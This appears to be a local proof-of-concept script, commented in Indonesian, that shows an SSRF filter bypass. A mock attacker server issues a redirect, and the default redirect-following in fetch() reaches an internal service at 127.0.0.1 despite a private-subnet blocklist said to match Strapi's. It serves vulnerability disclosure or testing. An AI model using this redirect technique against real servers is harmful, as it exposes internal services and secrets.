const http = require('node:http');
const net = require('node:net');

// SSRF Blocklist (sama dengan Strapi source code)
const SSRF_BLOCK_LIST = new net.BlockList();
SSRF_BLOCK_LIST.addSubnet('127.0.0.0', 8);
SSRF_BLOCK_LIST.addSubnet('10.0.0.0', 8);
SSRF_BLOCK_LIST.addSubnet('172.16.0.0', 12);
SSRF_BLOCK_LIST.addSubnet('192.168.0.0', 16);
SSRF_BLOCK_LIST.addSubnet('169.254.0.0', 16);

// Mock internal service (simulasi cloud metadata / internal API)
const internalService = http.createServer((req, res) => {
  console.log('[INTERNAL] Request:', req.url);
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('INTERNAL_SECRET_TOKEN=ssrf-via-redirect-works');
});

// Mock redirect server (simulasi attacker-controlled public URL)
const redirectServer = http.createServer((req, res) => {
  console.log('[REDIRECT] Redirecting to internal service');
  res.writeHead(302, { Location: 'http://127.0.0.1:18888/secret' });
  res.end();
});

async function main() {
  await new Promise((r) => internalService.listen(18888, '127.0.0.1', r));
  await new Promise((r) => redirectServer.listen(19999, '0.0.0.0', r));

  // fetch() default: redirect: 'follow' — otomatis ikuti redirect
  const response = await fetch('http://localhost:19999/download');

  console.log('Final URL:', response.url); // http://127.0.0.1:18888/secret
  console.log('Body:', await response.text()); // INTERNAL_SECRET_TOKEN=...
  console.log('Vulnerable:', response.url.includes('127.0.0.1')); // true

  internalService.close();
  redirectServer.close();
}

main().catch(console.error);
